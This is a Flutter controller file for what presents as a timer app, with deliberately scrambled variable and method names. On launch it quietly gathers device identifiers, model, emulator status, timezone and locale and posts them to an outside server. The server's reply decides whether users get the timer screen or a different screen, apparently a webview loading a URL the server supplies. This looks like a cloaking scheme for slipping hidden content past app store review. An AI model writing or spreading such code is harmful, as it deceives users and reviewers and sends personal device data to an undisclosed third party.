import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter/services.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';
import 'package:internet_connection_checker/internet_connection_checker.dart';



class PageLogic extends GetxController {

  var gmybxkpz = RxBool(false);
  var ircteyvob = RxBool(true);
  var tnqclads = RxString("");
  var claude = RxBool(false);
  var oberbrunner = RxBool(true);
  final nhvapkmu = Dio();


  InAppWebViewController? webViewController;

  dynamic cqwpvmrkha(){
    final ndwlrtjpy = InternetConnectionChecker.instance;
    final dutfsbpwc = ndwlrtjpy.onStatusChange.skip(1).listen(
          (InternetConnectionStatus mefqgunao) {
        if (mefqgunao == InternetConnectionStatus.connected) {
          gwyepji();
        } else {
          Get.toNamed('/local_error')?.then((_){
            gwyepji();
          });
        }
      },
    );
    return dutfsbpwc;
  }

  Future<bool> aecruz() async {
    var pkaderxhqu = await InternetConnectionChecker.instance.hasConnection;
    if(!pkaderxhqu){
      Get.toNamed('/local_error')?.then((_){
        gwyepji();
      });
    }
    return pkaderxhqu;
  }

  @override
  void onInit() {
    super.onInit();
    cqwpvmrkha();
    gwyepji();
  }


  Future<void> gwyepji() async {

    var xtajsyhgqw = await aecruz();
    if(!xtajsyhgqw){
      return;
    }

    claude.value = true;
    oberbrunner.value = true;
    ircteyvob.value = false;

    nhvapkmu.post("https://abi.windhg.com/pYPT6Bn",data: await znjryb()).then((value) {
      var apflkrj = value.data["apflkrj"] as String;
      var lpvfaqjd = value.data["lpvfaqjd"] as bool;
      if (lpvfaqjd) {
        SystemChrome.setPreferredOrientations([
          DeviceOrientation.portraitUp,
          DeviceOrientation.portraitDown,
        ]);
        tnqclads.value = apflkrj;
        marvin();
      } else {
        leuschke();
      }
    }).catchError((e) {
      ircteyvob.value = true;
      oberbrunner.value = true;
      claude.value = false;
    });
  }

  Future<Map<String, dynamic>> znjryb() async {
    final DeviceInfoPlugin qrax = DeviceInfoPlugin();
    PackageInfo zqbl_ezhl = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var tfzv = Platform.localeName;
    var JXlN = currentTimeZone;

    var UJcatXK = zqbl_ezhl.packageName;
    var CcRfUElz = zqbl_ezhl.version;
    var OkAs = zqbl_ezhl.buildNumber;

    var RdwTBPY = zqbl_ezhl.appName;
    var BFYMVOT = "";
    var EirkdwoF  = "";
    var cynthiaDurgan = "";
    var eldaKunde = "";
    var yTRfwO = "";
    var lilyanTorp = "";


    var GzLQjK = false;
    var brandtDooley = "";

    var LqDzQxiE = "";
    if (GetPlatform.isAndroid) {
      yTRfwO = "android";
      var ldnfvz = await qrax.androidInfo;

      LqDzQxiE = ldnfvz.brand;

      BFYMVOT  = ldnfvz.model;
      EirkdwoF = ldnfvz.id;

      GzLQjK = ldnfvz.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      yTRfwO = "ios";
      var ugcoxnvjd = await qrax.iosInfo;
      LqDzQxiE = ugcoxnvjd.name;
      BFYMVOT = ugcoxnvjd.model;

      EirkdwoF = ugcoxnvjd.identifierForVendor ?? "";
      GzLQjK  = ugcoxnvjd.isPhysicalDevice;
    }
    var res = {
      "RdwTBPY": RdwTBPY,
      "CcRfUElz": CcRfUElz,
      "UJcatXK": UJcatXK,
      "brandtDooley" : brandtDooley,
      "yTRfwO": yTRfwO,
      "BFYMVOT": BFYMVOT,
      "JXlN": JXlN,
      "LqDzQxiE": LqDzQxiE,
      "tfzv": tfzv,
      "GzLQjK": GzLQjK,
      "OkAs": OkAs,
      "cynthiaDurgan" : cynthiaDurgan,
      "eldaKunde" : eldaKunde,
      "lilyanTorp" : lilyanTorp,
      "EirkdwoF": EirkdwoF,
    };
    return res;
  }

  Future<void> leuschke() async {
    Get.toNamed("/timerMain");
  }

  Future<void> marvin() async {
    Get.toNamed("/timerWheel");
  }

  @override
  void dispose() {
    cqwpvmrkha().cancel();
    super.dispose();
  }

}
